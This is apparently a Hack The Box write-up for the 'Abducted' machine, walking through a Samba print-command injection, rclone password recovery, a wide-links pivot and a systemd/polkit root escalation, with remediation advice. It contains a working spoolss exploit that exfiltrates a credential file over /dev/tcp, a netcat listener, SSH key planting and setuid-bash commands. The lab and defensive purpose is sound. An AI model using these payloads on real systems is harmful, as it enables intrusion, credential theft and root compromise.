## Summary

Abducted is a Medium Linux machine built around the on-premise file and print
server of a professional-services firm ("Hartley Group"). Only SSH and **Samba**
are exposed. The Samba installation is vulnerable to **CVE-2026-4480**, an
unauthenticated **print-subsystem command injection**: the client-supplied print
job name (`%J`) is passed to the configured `print command` without escaping, so a
job submitted directly over the **spoolss RPC** interface yields code execution as
the print-service account (`nobody`).

A world-readable offsite-backup `rclone.conf` leaks an **rclone-obscured** password
that decodes back to plaintext and is **reused** for the `scott` account (user
flag over SSH). A second Samba share configured with **`force user = marcus`** plus
**wide links** is abused to plant an `authorized_keys` file into `marcus`'s home,
pivoting to that user. `marcus` belongs to the **`operators`** group, which owns a
group-writable **systemd drop-in** directory for `smbd.service` and is delegated the
`reload-daemon`/`restart smbd` actions through **polkit** — combined, a drop-in
`ExecStartPre` runs as root and drops a setuid `bash`.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Abducted | Medium | Linux | Hack The Box |

## Attack Path

1. Nmap reveals only SSH (22) and Samba (139/445) — a Linux file/print server.
2. `smbclient -L` (anonymous) lists a guest-accessible **printer** share `HP-Reception` plus credential-gated `projects` and `transfer` disk shares.
3. **CVE-2026-4480** — the printer's `print command = /usr/local/bin/printaudit %J %s` uses the job name `%J` unquoted. Submitting a job over **spoolss** with `document_name = "|sh"` makes the server run `printaudit | sh <spoolfile>`, executing the spool body. Unauthenticated code execution as `nobody`.
4. `/opt/offsite-backup/rclone.conf` is world-readable and holds an **rclone-obscured** SFTP password; `rclone reveal` decodes it to plaintext.
5. That password is **reused** for `scott` → SSH login → **user flag**.
6. `smb.conf`/`shares.conf` show the `transfer` share with `force user = marcus`, `wide links = yes`, and global `unix extensions = no` + `allow insecure wide links = yes`.
7. `scott` owns `/srv/transfer` on disk; a symlink `mh → /home/marcus` plus an SMB write (as `marcus`, via `force user`) plants `~marcus/.ssh/authorized_keys` → SSH as `marcus`.
8. `marcus` is in `operators`, which owns the group-writable `/etc/systemd/system/smbd.service.d` and is granted `reload-daemon` + conditional `restart smbd` by **polkit**.
9. A drop-in `override.conf` with `ExecStartPre` copies `bash` and sets it setuid root; `daemon-reload` + `restart smbd` triggers it → root shell → **root flag**.

## Reconnaissance

Nmap over the VPN (high latency, so a plain connect scan). Only three ports:

```bash
nmap -Pn -sT -sCV -p- 10.129.244.177
```

| Port | Service | Notes |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.6p1 (Ubuntu 24.04) |
| 139 | netbios-ssn | Samba smbd 4 |
| 445 | microsoft-ds | Samba smbd 4 |

No web service. Anonymous share enumeration exposes a printer and two disk shares:

```bash
smbclient -L //10.129.244.177/ -N
#   Sharename     Type      Comment
#   HP-Reception  Printer   Reception printer
#   projects      Disk      Hartley Group Project Files
#   transfer      Disk      Staff file transfer
#   IPC$          IPC       IPC Service (Hartley Group Document Services)
```

`projects` and `transfer` reject anonymous access; `HP-Reception` allows guest
printing (`nxc smb ... --shares` shows `WRITE` for guest). The pinned Samba build is
not recoverable remotely — SMB2 negotiation carries no package version and
`rpcclient srvinfo` reports a hard-coded `os version 6.1`. What singles out the bug
is the exposed surface: of the May 2026 Samba security batch, the print-command
injection is the only issue reachable **unauthenticated**, and a guest-writable
printer share is exactly its precondition.

## Foothold — CVE-2026-4480 (Samba print-command injection)

After a print job finishes spooling, Samba (with `printing = sysv`) runs the
configured `print command` through `system()`, substituting macros verbatim: `%s`
is the spool-file path and `%J` is the client-supplied job name. On this host:

```
print command = /usr/local/bin/printaudit %J %s
```

`%J` is attacker-controlled and unquoted. Before the fix, the only sanitisation was
turning `'` into `_`; `|`, `;`, spaces, `<`, `>`, `&` all reach the shell. A job name
of `|sh` makes Samba execute:

```
/usr/local/bin/printaudit | sh <spoolfile>
```

so the **spool-file body is run as a shell script** with no character restrictions.

The catch: queuing through `smbclient`/`smbspool` sends the name over the legacy RAP
interface, which sanitises metacharacters. To reach the vulnerable substitution the
job must be submitted directly over **spoolss** — exposed by the Samba Python
bindings. The job lifecycle is `OpenPrinter → StartDocPrinter (sets document_name =
%J) → StartPagePrinter → WritePrinter (body = %s) → EndPagePrinter → EndDocPrinter
(fires the print command) → ClosePrinter`, all as an anonymous guest.

The injection is blind, so the spool body detaches (`setsid ... &` — the print
command runs synchronously inside `EndDocPrinter`) and calls back with the one file
needed for the next step, rather than dropping an interactive shell:

```python
#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials
import base64

RHOST, LHOST, LPORT = "10.129.244.177", "10.10.15.137", 9001

# spool body: read + reveal the backup password and exfil it over one TCP callback
bash = f'''
P=$(sed -n 's/^[[:space:]]*pass = //p' /opt/offsite-backup/rclone.conf)
exec 3<>/dev/tcp/{LHOST}/{LPORT}
echo "OBSCURED=$P" >&3
echo "REVEALED=$(rclone reveal "$P")" >&3
cat /opt/offsite-backup/rclone.conf >&3
'''
b64 = base64.b64encode(bash.encode()).decode()
DATA = (f"echo {b64} | base64 -d | setsid bash >/dev/null 2>&1 &\n").encode()

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp); creds.set_anonymous()
iface = spoolss.spoolss(rf"ncacn_np:{RHOST}[\pipe\spoolss]", lp, creds)
h = iface.OpenPrinter(f"\\\\{RHOST}\\HP-Reception", "", spoolss.DevmodeContainer(), 0x00000008)
i1 = spoolss.DocumentInfo1(); i1.document_name = "|sh"; i1.output_file = None; i1.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1
iface.StartDocPrinter(h, ctr); iface.StartPagePrinter(h)
iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h); iface.EndDocPrinter(h); iface.ClosePrinter(h)
```

A listener (`nc -lvnp 9001`) receives the callback:

```
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
OBSCURED=HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
REVEALED=<plaintext>
```

## Lateral Movement — rclone obscure → scott

The offsite-backup job stores its SFTP credential with rclone, which does **not**
encrypt passwords — it only "obscures" them in a reversible AES-CTR/base64 encoding
that rclone itself decodes:

```
# /opt/offsite-backup/rclone.conf (world-readable)
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw   # -> plaintext password
```

The recovered password is **reused** for `scott`, giving SSH and the user flag:

```bash
ssh scott@10.129.244.177
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
scott@abducted:~$ cat user.txt        # user flag
```

## Privilege Escalation

### 1. scott → marcus (Samba `force user` + wide links)

`/etc/samba/shares.conf` defines the `transfer` share with `force user = marcus`, so
every file operation through the share runs as `marcus` regardless of who
authenticated. Combined with `wide links = yes` and the global `allow insecure wide
links = yes` (which overrides Samba's usual `unix extensions` protection), Samba will
follow a symlink out of the share tree:

```ini
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
```
```
unix extensions = no
allow insecure wide links = yes
```

`scott` owns `/srv/transfer` on disk, so a symlink pointing at `marcus`'s home lets
an SMB write land in `~marcus/.ssh` **owned by marcus**:

```bash
scott@abducted:~$ ln -sfn /home/marcus /srv/transfer/mh
# from the attacker box, authenticated as scott, writing through the share as marcus:
smbclient //10.129.244.177/transfer -U 'scott%<password>' \
  -c 'mkdir mh\.ssh; put id_ed25519.pub mh\.ssh\authorized_keys'

ssh -i id_ed25519 marcus@10.129.244.177
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

### 2. marcus → root (polkit-delegated systemd drop-in)

`marcus` is in `operators`, and that group owns a **group-writable, setgid** systemd
drop-in directory for the (root) smbd service:

```bash
marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d
drwxrws--- 2 root operators 4096 ... /etc/systemd/system/smbd.service.d
```

Any `*.conf` dropped here is merged into `smbd.service`, and `ExecStartPre=` runs as
the service user (**root**) before the main process. The change is inert until the
unit is reloaded and restarted — which an unprivileged user normally cannot do to a
root service. Walking polkit actions with `pkcheck` shows what `operators` may do
without authenticating:

```bash
for a in $(pkaction); do pkcheck --action-id "$a" --process $$ 2>/dev/null && echo "ALLOWED: $a"; done
# ALLOWED: org.freedesktop.systemd1.reload-daemon
```

`reload-daemon` is granted outright; `manage-units` is granted conditionally on
`unit == "smbd.service"`, so `systemctl restart smbd` succeeds without a password
while any other unit would prompt. The group-writable drop-in and the polkit
delegation combine into a direct root path:

```bash
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
marcus@abducted:~$ ls -l /tmp/.rb
-rwsr-xr-x 1 root root 1446024 ... /tmp/.rb
marcus@abducted:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'
uid=1001(marcus) ... euid=0(root) ...
# root flag
```

## Vulnerability Analysis

- **CVE-2026-4480 (Samba print-command injection)** — `%J` (client job name) is
  passed to `system()` in `generic_job_submit()` without shell-safe quoting; only
  `printing = bsd/sysv`/`lprng` backends that run a `print command` are affected.
  *Fix:* upgrade to Samba 4.22.10 / 4.23.8 / 4.24.3+ (which mask unsafe characters and
  single-quote `%J`), use `printing = cups`, and never expose a guest-writable printer.
- **Reversible "obscured" secrets** — rclone obscure is not encryption; anyone who
  reads the config recovers the plaintext. *Fix:* protect `rclone.conf` (0600, dedicated
  user), or use `RCLONE_CONFIG_PASS`/a secrets store.
- **Password reuse** — the backup SFTP password doubled as the `scott` login. *Fix:*
  unique credentials per account and service.
- **Samba `wide links` + `force user`** — following symlinks out of the share while
  forcing a fixed owner turns a low-priv share write into an arbitrary-file write as
  another user. *Fix:* keep `wide links = no` / `allow insecure wide links = no`, avoid
  `force user`, and constrain share paths.
- **Group-writable systemd drop-in + polkit delegation** — a writable
  `*.service.d` directory plus a password-less `reload-daemon`/`restart` grant is
  arbitrary root command execution. *Fix:* drop-in directories must be root-only; scope
  polkit rules tightly and never let a delegated restart pair with a writable unit dir.

## Tools Used

- **Nmap** — port and service discovery
- **smbclient / netexec (nxc) / rpcclient** — SMB share enumeration
- **Python + Samba `spoolss` bindings** — CVE-2026-4480 spoolss print-injection exploit
- **rclone** — decoding the obscured backup password
- **OpenSSH / ssh-keygen** — credential validation, key planting, shell access
- **pkaction / pkcheck** — enumerating polkit-delegated actions
- **systemd (drop-in + `ExecStartPre`)** — root command execution

## Key Takeaways

- A guest-writable printer share is a full unauthenticated RCE precondition when the
  print backend runs a shell `print command` with an unquoted `%J`.
- Print-injection must go over **spoolss** directly — the legacy RAP path sanitises
  the job name, so the Samba Python bindings are the reliable delivery channel.
- rclone "obscured" passwords are reversible by design; treat them as plaintext.
- `force user` + `wide links` is a classic Samba cross-user write primitive.
- A writable systemd drop-in directory only becomes root when something lets you
  reload/restart the unit — here a narrowly-scoped polkit rule supplied exactly that.
